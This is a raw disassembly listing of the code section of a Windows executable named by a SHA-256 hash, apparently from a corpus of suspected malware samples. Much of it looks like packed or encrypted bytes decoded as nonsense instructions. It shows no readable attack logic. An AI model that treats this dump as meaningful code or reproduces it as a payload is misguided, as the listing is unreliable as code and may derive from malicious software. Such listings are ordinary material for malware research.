
210ffb6439b1e3cf0d498dcf3faa5ad8e212c7ee903ae2f3686c3609a1251f6c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428257,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x4282ff,0x0
  401016:	mov    DWORD PTR ds:0x4282cf,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42821f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x4282ff,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d54
  40104b:	mov    ecx,DWORD PTR ds:0x428387
  401051:	sub    DWORD PTR ds:0x42823b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428267
  40105e:	and    DWORD PTR ds:0x428223,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x4281af
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x4282a7
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42835f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x42828b
  401089:	mov    edx,DWORD PTR ds:0x42838b
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x4282ef,ebx
  40109a:	and    DWORD PTR ds:0x428237,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0x74befcb3]
  4010b6:	and    ah,bl
  4010b8:	stos   BYTE PTR es:[edi],al
  4010b9:	sbb    BYTE PTR [eax],bl
  4010bb:	sbb    BYTE PTR [eax],bl
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    BYTE PTR [eax+0x37],dl
  4010c3:	inc    edi
  4010c4:	sub    eax,eax
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	clc    
  4010cb:	out    0x2e,al
  4010cd:	or     dl,bh
  4010cf:	xor    DWORD PTR [ecx+0x17f91910],esi
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    DWORD PTR [eax-0x60e1d333],esi
  40111f:	lea    edi,[esi+0x13]
  401122:	gs and al,0xa3
  401125:	es dec esi
  401127:	loope  0x401118
  401129:	into   
  40112a:	sub    al,0x4
  40112c:	fwait
  40112d:	pop    es
  40112e:	add    eax,0xc4c00044
  401133:	add    eax,0x800e62a
  401138:	adc    eax,DWORD PTR [esi]
  40113a:	jnp    0x40114a
  40113c:	xchg   esi,eax
  40113d:	sbb    esp,ebp
  40113f:	sti    
  401140:	jbe    0x4011a2
  401142:	(bad)  
  401143:	adc    DWORD PTR [esi-0x42087a2],esp
  401149:	hlt    
  40114a:	imul   edi,esp,0x6d
  40114d:	stos   BYTE PTR es:[edi],al
  40114e:	dec    ecx
  40114f:	shl    DWORD PTR [ebx+edi*4+0x66],1
  401153:	call   0xc887:0xb65be15d
  40115a:	sbb    edx,ecx
  40115c:	mov    eax,DWORD PTR [edx+0x6449b920]
  401162:	add    ch,BYTE PTR [edi+ebx*8+0x28fa8640]
  401169:	mov    al,ds:0x8a1ef66f
  40116e:	inc    esp
  40116f:	sar    esi,cl
  401171:	gs ds inc ebp
  401174:	push   0xb6c0a067
  401179:	push   ss
  40117a:	(bad)  
  40117b:	xor    edi,DWORD PTR [ecx]
  40117d:	ins    DWORD PTR es:[edi],dx
  40117e:	sub    ch,BYTE PTR [ebx]
  401180:	(bad)  [esi+0x7d]
  401183:	inc    ebp
  401184:	loope  0x401158
  401186:	retf   
  401187:	jge    0x4011fd
  401189:	cmp    eax,0xf2eea07b
  40118e:	out    dx,al
  40118f:	adc    ah,BYTE PTR [edx+0x47]
  401192:	jl     0x4011cc
  401194:	stos   DWORD PTR es:[edi],eax
  401195:	xor    dl,bl
  401197:	pop    esp
  401198:	mov    esp,0x2dd2d474
  40119d:	into   
  40119e:	sub    al,0xd2
  4011a0:	adc    esp,DWORD PTR [ebx]
  4011a2:	call   0x4583:0xf1a56065
  4011a9:	jmp    0xb5845e4c
  4011ae:	ror    DWORD PTR [edx],0xa
  4011b1:	ss mov ecx,0x6791003
  4011b7:	jp     0x40122c
  4011b9:	jge    0x4011cc
  4011bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011bc:	pop    es
  4011bd:	pop    ecx
  4011be:	addr16 inc ecx
  4011c0:	or     bl,BYTE PTR [eax+ecx*1-0x17c47407]
  4011c7:	addr16 (bad) 
  4011c9:	mov    esp,0x9f253ce5
  4011ce:	lahf   
  4011cf:	add    ebp,edx
  4011d1:	and    BYTE PTR [ebp+ebp*1+0x25],dh
  4011d5:	jmp    0x401226
  4011d7:	jg     0x401218
  4011d9:	mov    ecx,0x4b2ba188
  4011de:	imul   ecx,DWORD PTR [esi-0x39],0xc1bdf8d6
  4011e5:	cmp    DWORD PTR [esi-0x42bc8296],ebx
  4011eb:	inc    eax
  4011ec:	pop    edx
  4011ed:	jp     0x401268
  4011ef:	je     0x401184
  4011f1:	outs   dx,BYTE PTR ds:[esi]
  4011f2:	mov    edi,0xabb25ff3
  4011f7:	cmp    eax,0x5c7b707b
  4011fc:	jno    0x40122c
  4011fe:	aaa    
  4011ff:	inc    eax
  401200:	iret   
  401201:	loope  0x401244
  401203:	mov    ecx,DWORD PTR [ecx+esi*1+0x3]
  401207:	std    
  401208:	imul   esp,DWORD PTR [esi+ebx*4-0x2277ed2e],0x16
  401210:	push   edx
  401211:	jle    0x40123a
  401213:	jecxz  0x401276
  401215:	ins    BYTE PTR es:[edi],dx
  401216:	mov    bh,0xbc
  401218:	push   0x52
  40121a:	ror    DWORD PTR [edi+eax*4-0x349b774d],cl
  401221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401222:	inc    ecx
  401223:	mov    bh,0xff
  401225:	pop    ebx
  401226:	mov    edx,0xacf6b16e
  40122b:	mov    dl,cl
  40122d:	mov    ds:0x9ca22f8a,al
  401232:	mov    fs,WORD PTR [ebp-0x2ba2a227]
  401238:	sbb    BYTE PTR [ebp-0x3f1d3f3d],0xd4
  40123f:	jg     0x401273
  401241:	dec    esp
  401242:	rcl    BYTE PTR [edi+0x64f7039],1
  401248:	lods   al,BYTE PTR ds:[esi]
  401249:	call   0x512be853
  40124e:	mov    esp,0xe346b605
  401253:	lock and eax,0x1ce79626
  401259:	inc    eax
  40125a:	call   0x762a:0xe3bad643
  401261:	push   edi
  401262:	mov    dh,0x47
  401264:	cmp    edx,DWORD PTR [esi+0x2d]
  401267:	xor    ebx,ecx
  401269:	jae    0x401252
  40126b:	inc    ebx
  40126c:	add    ebx,ebp
  40126e:	arpl   di,ax
  401270:	fsub   QWORD PTR [edi+0x7a7e4744]
  401276:	cs xor eax,0x438247b5
  40127c:	hlt    
  40127d:	loopne 0x40122c
  40127f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401280:	daa    
  401281:	inc    eax
  401282:	into   
  401283:	jnp    0x401294
  401285:	inc    eax
  401286:	adc    dh,BYTE PTR [eax*2-0x8c91532]
  40128d:	mov    eax,ds:0xcf983975
  401292:	stos   DWORD PTR es:[edi],eax
  401293:	lods   al,BYTE PTR ds:[esi]
  401294:	outs   dx,BYTE PTR ds:[esi]
  401295:	fdivr  QWORD PTR [esi]
  401297:	or     BYTE PTR ds:0x678a434c,0x88
  40129e:	push   esi
  40129f:	jns    0x4012b6
  4012a1:	jmp    0xd40b:0x1dd274e4
  4012a8:	pop    eax
  4012a9:	fs pop edi
  4012ab:	jne    0x4012d1
  4012ad:	dec    edx
  4012ae:	adc    DWORD PTR [ebp-0xd58b322],ebp
  4012b4:	sbb    eax,DWORD PTR [ecx-0x4c]
  4012b7:	mov    fs,WORD PTR [ebx-0x1c07c5df]
  4012bd:	pushf  
  4012be:	mov    al,0x92
  4012c0:	inc    eax
  4012c1:	sub    DWORD PTR [ebp-0x2f],ecx
  4012c4:	pop    ss
  4012c5:	xlat   BYTE PTR ds:[ebx]
  4012c6:	ins    BYTE PTR es:[edi],dx
  4012c7:	pop    edi
  4012c8:	xchg   esp,eax
  4012c9:	pop    edx
  4012ca:	sahf   
  4012cb:	sbb    al,0x30
  4012cd:	pop    edi
  4012ce:	sti    
  4012cf:	mov    BYTE PTR ds:0xc1c6a207,ch
  4012d5:	adc    eax,0x7b2f47da
  4012da:	dec    ecx
  4012db:	xchg   edx,eax
  4012dc:	inc    cx
  4012de:	jno    0x4012bb
  4012e0:	retf   0x5007
  4012e3:	ins    DWORD PTR es:[edi],dx
  4012e4:	push   eax
  4012e5:	lea    ecx,[edi]
  4012e7:	pop    edx
  4012e8:	fistp  DWORD PTR [edi-0x33112c46]
  4012ee:	or     eax,0x1171aa8f
  4012f3:	xor    edi,DWORD PTR [esi-0x7a]
  4012f6:	push   es
  4012f7:	xchg   ebx,eax
  4012f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012f9:	xlat   BYTE PTR ds:[ebx]
  4012fa:	pop    ecx
  4012fb:	and    dl,BYTE PTR [esi]
  4012fd:	add    DWORD PTR [ecx+0x410184ea],ebx
  401303:	pop    ds
  401304:	cmc    
  401305:	adc    edi,DWORD PTR [eax-0x2fd69b7a]
  40130b:	fld    QWORD PTR [esi+0x1f]
  40130e:	mov    WORD PTR [ebp-0x4d0fdd97],es
  401314:	mov    eax,0x8ce9ed0
  401319:	fldcw  WORD PTR [ecx-0x7a]
  40131c:	fisub  WORD PTR [ecx-0x41]
  40131f:	les    edi,FWORD PTR [ebp-0x30b22fde]
  401325:	mov    edx,0x107755d6
  40132a:	daa    
  40132b:	pop    esp
  40132c:	clc    
  40132d:	data16 and BYTE PTR [ebp-0x7a4d49],ch
  401334:	fs mov dh,0x22
  401337:	sbb    al,0xff
  401339:	stos   BYTE PTR es:[edi],al
  40133a:	mov    eax,0xe2426604
  40133f:	mov    edi,0x297a2315
  401344:	push   ebx
  401345:	pop    es
  401346:	lds    esi,FWORD PTR [edi+0x6440cbe]
  40134c:	sbb    BYTE PTR [ebx-0xb0ee1b0],0x59
  401353:	dec    edi
  401354:	or     ah,BYTE PTR [eax+0x23]
  401357:	gs scas al,BYTE PTR es:[edi]
  401359:	(bad)  
  40135a:	jecxz  0x401366
  40135c:	das    
  40135d:	xchg   ebx,eax
  40135e:	test   DWORD PTR [edx-0x363f2bb0],edx
  401364:	jb     0x401304
  401366:	or     dl,ah
  401368:	pushf  
  401369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40136a:	cmp    eax,0x557d5153
  40136f:	aad    0x74
  401371:	mov    esi,0xf090cb4f
  401376:	or     eax,0xb74b680c
  40137b:	cmp    esi,DWORD PTR [ebp+0x23]
  40137e:	test   DWORD PTR [ecx+0x79],edi
  401381:	or     BYTE PTR [ebx+0x4a],cl
  401384:	or     BYTE PTR [edi],ch
  401386:	mov    eax,0x34ae4254
  40138b:	inc    esi
  40138c:	jb     0x401407
  40138e:	fcomp  QWORD PTR [ebx]
  401390:	gs inc edi
  401392:	xor    al,0xba
  401394:	(bad)  
  401395:	sbb    al,0x8d
  401397:	push   ss
  401398:	shl    BYTE PTR [edi+0x60],cl
  40139b:	sbb    al,0x67
  40139d:	mov    ch,0x44
  40139f:	mov    ah,0x97
  4013a1:	xor    DWORD PTR [edx+0x12043dfd],0x2e
  4013a8:	mov    edi,?
  4013aa:	imul   ebx,DWORD PTR [edx-0x1b],0x121fd230
  4013b1:	mov    DWORD PTR [ebx],eax
  4013b3:	cmp    DWORD PTR [edi+ebx*2-0x2976a8a],edx
  4013ba:	jae    0x4013f2
  4013bc:	sbb    cl,BYTE PTR [ebx+0x6c380975]
  4013c2:	ds pop ds
  4013c4:	mov    al,ds:0x3f9604b4
  4013c9:	mov    cl,0x1f
  4013cb:	mov    esi,0xf045db2d
  4013d0:	or     al,al
  4013d2:	mov    ds:0xfd2b87d9,al
  4013d7:	push   0x3df9e0bc
  4013dc:	dec    esp
  4013dd:	pop    ebx
  4013de:	(bad)  
  4013e0:	cmp    BYTE PTR [ebp-0x4fd413c5],al
  4013e6:	lods   al,BYTE PTR ds:[esi]
  4013e7:	push   esp
  4013e8:	int    0xce
  4013ea:	test   al,0x4d
  4013ec:	repnz enter 0xb0c1,0x6c
  4013f1:	pusha  
  4013f2:	cwde   
  4013f3:	cmp    eax,0xa1a1484c
  4013f8:	mov    ecx,0xc80eae30
  4013fd:	retf   
  4013fe:	pusha  
  4013ff:	dec    eax
  401400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401401:	mov    cl,0x4b
  401403:	ficom  DWORD PTR [edx]
  401405:	scas   eax,DWORD PTR es:[edi]
  401406:	or     BYTE PTR [ebx+edi*2-0x75c25322],0x69
  40140e:	mov    bh,0xd6
  401410:	pusha  
  401411:	adc    al,0x2e
  401413:	fcomp  DWORD PTR [edi]
  401415:	xor    ebx,DWORD PTR [edx-0x384b6099]
  40141b:	shl    BYTE PTR [ebx+0x16],cl
  40141e:	mov    esi,0x11465767
  401423:	lock lods al,BYTE PTR ds:[esi]
  401425:	push   0x73
  401427:	retf   0xa46d
  40142a:	stos   DWORD PTR es:[edi],eax
  40142b:	iret   
  40142c:	jnp    0x4013f7
  40142e:	(bad)  
  40142f:	outs   dx,BYTE PTR ds:[esi]
  401430:	sub    BYTE PTR [ebx],al
  401432:	ud0    edx,DWORD PTR [ecx+ebp*1-0x11]
  401437:	and    bl,al
  401439:	and    al,0x76
  40143b:	mov    ebp,0x8c84fa2f
  401440:	add    eax,0x827f5000
  401445:	fadd   DWORD PTR [edi]
  401447:	or     dh,BYTE PTR [edx]
  401449:	add    cl,bl
  40144b:	adc    ebp,DWORD PTR [edi+esi*4-0x67]
  40144f:	scas   eax,DWORD PTR es:[edi]
  401450:	lods   eax,DWORD PTR ds:[esi]
  401451:	ss inc edx
  401453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401454:	in     eax,dx
  401455:	in     al,dx
  401456:	repnz xor bh,dl
  401459:	stos   BYTE PTR es:[edi],al
  40145a:	jl     0x401427
  40145c:	loope  0x401406
  40145e:	test   BYTE PTR [edx-0xf],0x4d
  401462:	(bad)  
  401463:	xor    eax,0xc8eb4c27
  401468:	imul   esp,DWORD PTR [edi+0x1ad09a04],0xffffffa4
  40146f:	gs xor bl,dl
  401472:	or     eax,DWORD PTR [eax+0x48576c89]
  401478:	and    dh,BYTE PTR [edx+edi*4-0x7d]
  40147c:	sub    BYTE PTR [ecx+0x344100c],ah
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x42834f,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x42828b
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282db,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42820b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428233,0x0
  4014da:	mov    DWORD PTR ds:0x42820f,ecx
  4014e0:	mov    DWORD PTR ds:0x4282d3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42814b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428233,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d58
  40151c:	mov    edx,DWORD PTR ds:0x4282ab
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428323
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42817f
  401537:	mov    edi,DWORD PTR ds:0x428327
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp+0x77c7c770]
  401569:	jl     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x6181812],bl
  401573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401574:	xchg   ebp,eax
  401575:	faddp  st(4),st
  401577:	mov    ah,0x25
  401579:	sahf   
  40157a:	ins    BYTE PTR es:[edi],dx
  40157b:	sbb    ecx,ebx
  40157d:	inc    eax
  40157e:	and    eax,0x3cd1fc32
  401583:	aad    0xa1
  401585:	idiv   DWORD PTR [ebx-0x71f27632]
  40158b:	loopne 0x401551
  40158d:	aas    
  40158e:	mov    ch,0xcd
  401590:	retf   
  401591:	push   cs
  401592:	sbb    eax,0x98281ab3
  401597:	or     al,0x4c
  401599:	test   al,0x51
  40159b:	add    DWORD PTR [edi],edx
  40159d:	rol    cl,1
  40159f:	addr16 add eax,0x96ddb255
  4015a5:	sbb    ah,BYTE PTR [edx+0x730a2635]
  4015ab:	retf   
  4015ac:	cmc    
  4015ad:	jp     0x4015ca
  4015af:	ins    BYTE PTR es:[edi],dx
  4015b0:	mov    BYTE PTR [edi],dh
  4015b2:	push   edi
  4015b3:	xlat   BYTE PTR ds:[ebx]
  4015b4:	fcom   DWORD PTR [edi]
  4015b6:	repnz pushf 
  4015b8:	xchg   edx,eax
  4015b9:	dec    esi
  4015ba:	ds call 0x255417ed
  4015c0:	imul   edx,DWORD PTR ds:[ebx-0x5ec468c3],0xc
  4015c8:	inc    edi
  4015c9:	add    dl,BYTE PTR [edx-0x7c1439b6]
  4015cf:	jecxz  0x4015a7
  4015d1:	imul   ebx,DWORD PTR [edi],0x6f6a3f8b
  4015d7:	mov    ah,BYTE PTR [ecx]
  4015d9:	add    ah,BYTE PTR [ecx+eiz*2-0x11]
  4015dd:	mul    cl
  4015df:	xlat   BYTE PTR ds:[ebx]
  4015e0:	(bad)  
  4015e1:	addr16 pop ebx
  4015e3:	push   ss
  4015e4:	(bad)  
  4015e5:	test   BYTE PTR [ecx+eiz*4+0x6b],bl
  4015e9:	sub    DWORD PTR [ebp+0x0],edx
  4015ec:	test   esp,0xc99e9c36
  4015f2:	adc    al,0xdb
  4015f4:	mov    BYTE PTR [esi-0x137756ab],bl
  4015fa:	xor    al,0xf9
  4015fc:	js     0x4015a7
  4015fe:	xor    BYTE PTR [eax+0x21],0x95
  401602:	xor    eax,0xb8c5d275
  401607:	inc    ebp
  401608:	icebp  
  401609:	add    al,bh
  40160b:	xchg   edx,eax
  40160c:	je     0x401684
  40160e:	js     0x401615
  401610:	sbb    BYTE PTR [ebp+0x24],0x9b
  401614:	es (bad) 
  401616:	dec    ecx
  401617:	dec    edi
  401618:	pop    es
  401619:	clc    
  40161a:	mov    edi,0xb72ab0c4
  40161f:	adc    dh,bl
  401621:	inc    ebx
  401622:	repz (bad) 
  401624:	jg     0x4015eb
  401626:	jmp    0xd5dce3aa
  40162b:	jle    0x4015ad
  40162d:	sbb    esp,DWORD PTR [esi]
  40162f:	shl    DWORD PTR [esi],1
  401631:	(bad)  
  401632:	xchg   ebp,eax
  401633:	dec    eax
  401634:	fldcw  WORD PTR [ecx]
  401636:	push   ds
  401637:	and    dh,bh
  401639:	jecxz  0x4015f2
  40163b:	adc    ch,ch
  40163d:	pusha  
  40163e:	xlat   BYTE PTR ds:[ebx]
  40163f:	push   0x5b
  401641:	add    cl,BYTE PTR [ecx]
  401643:	ret    0x6550
  401646:	rol    DWORD PTR [ebx-0x6b5e9b5c],cl
  40164c:	(bad)
  40164f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401650:	popf   
  401651:	mov    edi,eax
  401653:	inc    esp
  401654:	add    eax,0x3ec33954
  401659:	dec    ebx
  40165a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40165b:	adc    BYTE PTR [esi+0x46],0x15
  40165f:	call   0x4554392e
  401664:	sbb    eax,0x8881a6b3
  401669:	dec    ebp
  40166a:	and    cl,BYTE PTR [edi]
  40166c:	mov    ecx,0x4462c320
  401671:	sbb    eax,0x812e7e3c
  401676:	in     al,0x4
  401678:	int3   
  401679:	dec    edi
  40167a:	clc    
  40167b:	cmp    BYTE PTR [ebp-0x46],cl
  40167e:	pop    edi
  40167f:	or     cl,cl
  401681:	scas   eax,DWORD PTR es:[edi]
  401682:	jb     0x40166a
  401684:	inc    esp
  401685:	ret    0xc15
  401688:	adc    BYTE PTR [ebp+0x2d],cl
  40168b:	xchg   esp,eax
  40168c:	inc    esi
  40168d:	ret    
  40168e:	aas    
  40168f:	add    esp,DWORD PTR [ebx-0x2e78c155]
  401695:	enter  0xe551,0x80
  401699:	loop   0x4016c9
  40169b:	cdq    
  40169c:	mov    bh,0x3b
  40169e:	les    ebx,FWORD PTR [edx+ecx*8]
  4016a1:	outs   dx,BYTE PTR ds:[esi]
  4016a2:	mov    bh,0x34
  4016a4:	adc    al,0x33
  4016a6:	fnstenv [ecx-0x3bee1ee4]
  4016ac:	cmp    al,0x12
  4016ae:	mov    eax,ds:0x1379ca8f
  4016b3:	in     al,0x48
  4016b5:	mov    bh,bl
  4016b7:	pop    DWORD PTR [eax+0x576ebeef]
  4016bd:	push   cs
  4016be:	out    0x12,eax
  4016c0:	fidivr DWORD PTR ds:[esi+ebx*4]
  4016c4:	das    
  4016c5:	adc    BYTE PTR [esi+esi*2],0x70
  4016c9:	cs cdq 
  4016cb:	pop    edx
  4016cc:	(bad)  [ebx]
  4016ce:	adc    DWORD PTR [edi],edi
  4016d0:	ret    
  4016d1:	dec    esp
  4016d2:	mov    eax,ds:0x6f9bb5d
  4016d7:	imul   eax,DWORD PTR [esi+eiz*1-0x2c],0x5ef8cede
  4016df:	push   cs
  4016e0:	sub    bh,cl
  4016e2:	xchg   edi,eax
  4016e4:	add    ch,BYTE PTR [edi]
  4016e6:	push   ss
  4016e7:	jp     0x4016b7
  4016e9:	dec    esi
  4016ea:	pop    eax
  4016eb:	lahf   
  4016ec:	and    ebp,ecx
  4016ee:	retf   0xc805
  4016f1:	and    al,0x89
  4016f3:	mul    DWORD PTR [ecx]
  4016f5:	xlat   BYTE PTR ds:[ebx]
  4016f6:	jno    0x4016ee
  4016f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f9:	pop    eax
  4016fa:	out    0x66,eax
  4016fc:	scas   eax,DWORD PTR es:[edi]
  4016fd:	jg     0x401683
  4016ff:	xor    esp,DWORD PTR [ebp-0x1a]
  401702:	cli    
  401703:	cli    
  401704:	(bad)  
  401705:	pop    edx
  401706:	jo     0x4016ab
  401708:	(bad)  
  401709:	hlt    
  40170a:	out    0xf6,eax
  40170c:	dec    eax
  40170d:	stos   DWORD PTR es:[edi],eax
  40170e:	sbb    eax,DWORD PTR [esi-0xe]
  401711:	sub    bl,BYTE PTR [esi+0x58]
  401714:	jmp    0x505e:0xf6245c76
  40171b:	mov    ebx,0x723c91a4
  401720:	in     eax,dx
  401721:	out    dx,al
  401722:	mov    bl,0x62
  401724:	inc    ebp
  401725:	add    BYTE PTR ds:0x21dc3608,bl
  40172b:	xor    BYTE PTR [ebx-0x7c356250],0xc
  401732:	add    bl,BYTE PTR [edi-0x13036ee2]
  401738:	and    ah,BYTE PTR [ebx-0x68]
  40173b:	and    esp,DWORD PTR [esi-0x129ba321]
  401741:	loopne 0x40178f
  401743:	in     eax,dx
  401744:	inc    edx
  401745:	stos   BYTE PTR es:[edi],al
  401746:	pop    esp
  401747:	push   ds
  401748:	adc    DWORD PTR [edx],ecx
  40174a:	stos   DWORD PTR es:[edi],eax
  40174b:	ins    DWORD PTR es:[edi],dx
  40174c:	add    ch,bh
  40174e:	fisubr DWORD PTR [ebx-0x61fda94e]
  401754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401755:	jmp    0x5078:0xa279e80c
  40175c:	dec    ecx
  40175d:	push   ecx
  40175e:	sar    al,1
  401760:	push   esp
  401761:	stos   DWORD PTR es:[edi],eax
  401762:	pop    ebp
  401763:	(bad)  
  401764:	jnp    0x4016ea
  401766:	cmc    
  401767:	outs   dx,BYTE PTR ds:[esi]
  401768:	test   DWORD PTR gs:[ebp-0x75],edx
  40176c:	cs int 0xb8
  40176f:	push   ebp
  401770:	push   0xffffff84
  401772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401773:	cdq    
  401774:	loopne 0x4016fa
  401776:	sahf   
  401777:	or     dl,BYTE PTR [edi+ebx*2+0x5d]
  40177b:	sub    BYTE PTR [ebx+ebx*2+0x5be60a57],bh
  401782:	push   edi
  401783:	add    bh,dl
  401785:	call   0x839d512c
  40178a:	(bad)  
  40178b:	fwait
  40178c:	sar    BYTE PTR [edx+eax*4+0x28b025a1],cl
  401793:	mov    eax,0x6ebb87f8
  401798:	xlat   BYTE PTR ds:[ebx]
  401799:	neg    DWORD PTR [esp+esi*1+0x1b]
  40179d:	pop    bp
  40179f:	mov    eax,ds:0x512f695a
  4017a4:	jmp    0x6fe5:0xa204d576
  4017ab:	xchg   DWORD PTR [esi+0x388f4a35],eax
  4017b1:	adc    al,0xfd
  4017b3:	adc    al,0x1b
  4017b5:	mov    esp,0xdf637804
  4017ba:	cdq    
  4017bb:	popa   
  4017bc:	repz mov eax,0x9ecd5afc
  4017c2:	repz out dx,eax
  4017c4:	pop    ebx
  4017c5:	pop    es
  4017c6:	dec    ecx
  4017c7:	outs   dx,BYTE PTR ds:[esi]
  4017c8:	aad    0x2c
  4017ca:	stc    
  4017cb:	adc    eax,0x27b99a0d
  4017d0:	fcom   DWORD PTR [eax-0xb]
  4017d3:	ret    0xaf76
  4017d6:	jbe    0x4017d8
  4017d8:	daa    
  4017d9:	imul   edi,DWORD PTR [eax],0x1f
  4017dc:	push   cs
  4017dd:	in     eax,0x13
  4017df:	daa    
  4017e0:	cmp    DWORD PTR [ebx+0xd3214dc],ecx
  4017e6:	lock or bl,BYTE PTR [edx]
  4017e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ea:	sub    ebp,DWORD PTR [eax-0x6b]
  4017ed:	cmp    al,BYTE PTR [eax]
  4017ef:	sbb    al,0x99
  4017f1:	cld    
  4017f2:	lods   al,BYTE PTR ds:[esi]
  4017f3:	jl     0x401811
  4017f5:	jns    0x4017f9
  4017f7:	outs   dx,BYTE PTR ds:[esi]
  4017f8:	pop    edi
  4017f9:	test   DWORD PTR [ebp-0x41],0x49c1c18b
  401800:	loope  0x40185a
  401802:	cmp    cl,BYTE PTR [esi]
  401804:	enter  0x2471,0xac
  401808:	scas   eax,DWORD PTR es:[edi]
  401809:	sub    esi,DWORD PTR [edi+0x78c8bb3f]
  40180f:	data16 fst DWORD PTR [ecx+0x4138af7f]
  401816:	cdq    
  401817:	xchg   edi,eax
  401818:	jge    0x4017b6
  40181a:	(bad)  
  40181b:	je     0x40179f
  40181d:	xor    esi,DWORD PTR [edx+0xf]
  401820:	fdiv   QWORD PTR [ecx]
  401822:	cmp    al,0xdd
  401824:	sub    al,0x3a
  401826:	or     al,0x73
  401828:	pop    ebp
  401829:	add    al,0xeb
  40182b:	xor    al,0x9d
  40182d:	pop    ebp
  40182e:	mov    ds:0x3aa03bb3,al
  401833:	ds out dx,eax
  401835:	es push edx
  401837:	outs   dx,BYTE PTR ds:[esi]
  401838:	mov    cl,0x80
  40183a:	jo     0x401890
  40183c:	push   eax
  40183d:	sbb    DWORD PTR fs:[ecx],0xe
  401841:	in     al,dx
  401842:	pop    esi
  401843:	fidiv  DWORD PTR [ecx+0x1fbd5fc1]
  401849:	bnd jl 0x401851
